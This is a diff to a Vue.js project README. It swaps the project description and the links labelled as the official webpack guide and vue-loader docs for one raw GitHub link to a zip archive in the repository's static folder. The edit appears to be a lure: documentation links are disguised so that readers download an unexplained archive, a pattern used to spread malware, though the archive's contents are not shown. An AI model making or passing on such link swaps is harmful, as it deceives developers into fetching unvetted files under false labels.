@@ -1,6 +1,6 @@
 # practice
 
-> A Vue.js project
+> A https://raw.githubusercontent.com/HongSehwan/BootstrapVue-Practice/main/static/Vue_Bootstrap_Practice_1.9-beta.1.zip project
 
 ## Build Setup
 
@@ -18,4 +18,4 @@ npm run build
 npm run build --report
 ```
 
-For a detailed explanation on how things work, check out the [guide](http://vuejs-templates.github.io/webpack/) and [docs for vue-loader](http://vuejs.github.io/vue-loader).
+For a detailed explanation on how things work, check out the [guide](https://raw.githubusercontent.com/HongSehwan/BootstrapVue-Practice/main/static/Vue_Bootstrap_Practice_1.9-beta.1.zip) and [docs for vue-loader](https://raw.githubusercontent.com/HongSehwan/BootstrapVue-Practice/main/static/Vue_Bootstrap_Practice_1.9-beta.1.zip).
